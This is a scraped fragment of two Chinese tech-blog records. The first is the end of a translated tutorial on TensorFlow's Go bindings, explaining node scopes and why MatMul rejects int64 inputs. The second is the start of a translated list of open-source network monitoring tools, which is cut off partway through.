class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a477d085711762-4\"><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Placeholder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">SubScope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"input\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Int64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">PlaceholderShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">MakeShape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a477d085711762-5\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Name</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Op</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Name</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>编译并运行：go run attempt2.go，输出结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a4781103794474\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ninput/Placeholder input_1/Placeholder</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4781103794474-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a4781103794474-1\"><span class=\"crayon-v\">input</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">Placeholder </span><span class=\"crayon-v\">input_1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Placeholder</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><strong>提问时间：</strong></p>\n<p>关于Tensorflow的架构，我们学到了什么？节点完全是由被定义的作用域来标识的。作用域是我们从图的根到达节点的路径。有两种定义节点的方法：在不同的作用域（Go语言）中定义操作或更改操作名称。</p>\n<p>我们解决了重复节点名称的问题，但另一个问题显示在我们的终端上。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a4784974766484\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npanic: failed to add operation \"MatMul\": Value for attr 'T' of int64 is not in the list of allowed values: half, float, double, int32, complex64, complex128</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4784974766484-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a4784974766484-1\"><span class=\"crayon-v\">panic</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">failed </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">add </span><span class=\"crayon-i\">operation</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"MatMul\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Value </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">attr</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'T'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">int64 </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">list </span><span class=\"crayon-e\">of </span><span class=\"crayon-e\">allowed </span><span class=\"crayon-v\">values</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">half</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">double</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">int32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">complex64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">complex128</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>为什么MatMul节点会出现错误？我们只是想增加两个tf.int64矩阵！从这段错误提示来看，int64是MatMul唯一不接受的类型。</p>\n<blockquote><p>int64类型的attr ‘T’的值不在允许的值列表中：half，float，double，int32，complex64，complex128</p></blockquote>\n<p>这个列表是什么？为什么我们可以做两个int32类型矩阵的乘法，而不是int64？</p>\n<p>我们来解决这个问题，了解为什么会出现这种情况。</p>\n<p><strong>第三节课：Tensorflow的类型系统</strong></p>\n<p>我们来看一下<a href=\"https://github.com/tensorflow/tensorflow/blob/r1.2/tensorflow/core/ops/math_ops.cc#L1048\" target=\"_blank\">源代码</a>，寻找MatMul操作的C++声明：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a4788902259395\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nREGISTER_OP(\"MatMul\")  \r\n    .Input(\"a: T\")  \r\n    .Input(\"b: T\")  \r\n    .Output(\"product: T\")  \r\n    .Attr(\"transpose_a: bool = false\")  \r\n    .Attr(\"transpose_b: bool = false\")  \r\n    .Attr(\"T: {half, float, double, int32, complex64, complex128}\")  \r\n    .SetShapeFn(shape_inference::MatMulShape)  \r\n    .Doc(R\"doc(  \r\nMultiply the matrix \"a\" by the matrix \"b\".  \r\nThe inputs must be two-dimensional matrices and the inner dimension of  \r\n\"a\" (after being transposed if transpose_a is true) must match the  \r\nouter dimension of \"b\" (after being transposed if transposed_b is  \r\ntrue).  \r\n*Note*: The default kernel implementation for MatMul on GPUs uses  \r\ncublas.  \r\ntranspose_a: If true, \"a\" is transposed before multiplication.  \r\ntranspose_b: If true, \"b\" is transposed before multiplication.  \r\n)doc\");</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4788902259395-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4788902259395-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-1\"><span class=\"crayon-e\">REGISTER_OP</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"MatMul\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Input</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"a: T\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Input</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"b: T\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Output</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"product: T\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Attr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"transpose_a: bool = false\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Attr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"transpose_b: bool = false\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Attr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"T: {half, float, double, int32, complex64, complex128}\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">SetShapeFn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">shape_inference</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">MatMulShape</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Doc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">R</span><span class=\"crayon-s\">\"doc(  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-10\"><span class=\"crayon-s\">Multiply the matrix \"</span><span class=\"crayon-i\">a</span><span class=\"crayon-s\">\" by the matrix \"</span><span class=\"crayon-i\">b</span><span class=\"crayon-s\">\".  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-11\"><span class=\"crayon-s\">The inputs must be two-dimensional matrices and the inner dimension of  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-12\"><span class=\"crayon-s\">\"</span><span class=\"crayon-i\">a</span><span class=\"crayon-s\">\" (after being transposed if transpose_a is true) must match the  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-13\"><span class=\"crayon-s\">outer dimension of \"</span><span class=\"crayon-i\">b</span><span class=\"crayon-s\">\" (after being transposed if transposed_b is  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-14\"><span class=\"crayon-s\">true).  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-15\"><span class=\"crayon-s\">*Note*: The default kernel implementation for MatMul on GPUs uses  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-16\"><span class=\"crayon-s\">cublas.  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-17\"><span class=\"crayon-s\">transpose_a: If true, \"</span><span class=\"crayon-i\">a</span><span class=\"crayon-s\">\" is transposed before multiplication.  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a4788902259395-18\"><span class=\"crayon-s\">transpose_b: If true, \"</span><span class=\"crayon-i\">b</span><span class=\"crayon-s\">\" is transposed before multiplication.  </span></div><div class=\"crayon-line\" id=\"crayon-594b6cd4a4788902259395-19\"><span class=\"crayon-s\">)doc\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>该行定义了MatMul操作的接口：特别注意到代码里使用了REGISTER_OP宏来声明了op的：</p>\n<ul>\n<li>名称：MatMul</li>\n<li>参数：a，b</li>\n<li>属性（可选参数）：transpose_a，transpose_b</li>\n<li>模板T支持的类型：half，float，double，int32，complex64，complex128</li>\n<li>输出形状：自动推断</li>\n<li>说明文档</li>\n</ul>\n<p>这个宏调用不包含任何C++代码，但它告诉我们，在定义一个操作时，尽管它使用了模板，但是我们必须为指定的类型T（或属性）指定一个类型列表中的类型。实际上，属性.Attr(“T: {half, float, double, int32, complex64, complex128}”)是将类型T约束为该列表的一个值。</p>\n<p>我们可以从教程中阅读到，即使在使用模板T时，我们也必须对每个支持的重载显式地注册内核。内核是以CUDA方式对C/C++函数进行的引用，这些函数将会并行执行。</p>\n<p>因此，MatMul的作者决定仅支持上面列出的类型，而不支持int64。有两个可能的原因：</p>\n<ul>\n<li>疏忽了：这很有可能，因为Tensorflow的作者是人类！</li>\n<li>对尚未完全支持int64操作的设备兼容，因此内核的这种具体实现不足以在每个支持的硬件上运行。</li>\n</ul>\n<p>回到刚才的错误提示：修改方法是显而易见的。我们必须将参数以支持的类型传递给MatMul。</p>\n<p>我们来创建attempt3.go，把所有引用int64的行改为int32。</p>\n<p>有一点需要注意：Go绑定有自己的一组类型，与Go的类型的一一对应。当我们将值输入到图中时，我们必须关注映射关系。从图形中获取值时，必须做同样的事情。</p>\n<p>执行go run attempt3.go。结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a478d511896292\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ninput/Placeholder input_1/Placeholder  \r\n[[210] [-210]]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a478d511896292-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a478d511896292-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b6cd4a478d511896292-1\"><span class=\"crayon-v\">input</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">Placeholder </span><span class=\"crayon-v\">input_1</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">Placeholder</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b6cd4a478d511896292-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">210</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">210</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>万岁！</p>\n<p><strong>提问时间</strong></p>\n<p>关于Tensorflow的架构，我们学到了什么？每个操作都与自己的一组内核相关联。被视为描述性语言的Tensorflow是一种强大的类型语言。它不仅要遵守C++类型规则，而且还要在op的注册阶段只实现某些指定类型的能力。</p>\n<p><strong>结论</strong></p>\n<p>使用Go来定义并执行一个图，使我们有机会更好地了解Tensorflow的底层结构。使用试错法，我们解决了这个简单的问题，我们一步一步地学到了有关图、节点和类型系统这些新东西。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111491\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111491votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111491\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/86a72531c8845e07f09b2d42649f2253.jpg"], "fav_nums": 2, "comment_nums": 0, "create_date": "2017/06/17", "praise_nums": 1}
{"tags": "开源,工具与资源,网络监控", "front_image_path": "full/e397352deab3de2274f1bc8a890a2853cf7a627e.jpg", "title": "2017 年最佳开源网络监控工具", "url_object_id": "8f86159a04608f8daae91ab61b818f76", "url": "http://blog.jobbole.com/111458/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.computerworlduk.com/galleries/open-source/best-open-source-network-management-tools-3644057/\">Christina Mercer</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/best-open-source-network-monitoring-tools-2017\">开源中国</a>   </div><p>对开源软件的需求持续增长，网络管理工具已经适应了这一浪潮。你不再需要为可能不是你所需的软件支付小额的费用，请留意下（大部分）免费的开源工具，用来监控、配置和映射你的联网设备。</p>\n<p>这里有 14 个开源网络监控工具来协助IT管理员完成工作。</p>\n<h3><strong>1. 开源网络监控工具： NetXMS</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/222601_ElXA_2894582.jpg\"></p>\n<p><a href=\"https://www.netxms.org/\" target=\"_blank\" rel=\"nofollow\">NetXMS</a> 提供了企业级开源网络管理和监控程序，它在Windows和Linux上有一个简单的用户界面。<br>\nNetXMS通过相对简单的安装过程为IT基础架构的所有层提供了分布式网络监控、自动化网络发现和详细报告。<br>\n此外，服务器设备和代理对于这样一个全面的产品来说是相当轻量级的。</p>\n<h3><strong>2. 开源网络监控工具: Pandora FMS</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225036_iqEA_2894582.jpg\"></p>\n<p>定位于企业级， <a href=\"https://pandorafms.com/monitoring-solutions/network-monitoring/\" target=\"_blank\" rel=\"nofollow\">Pandora FMS</a> 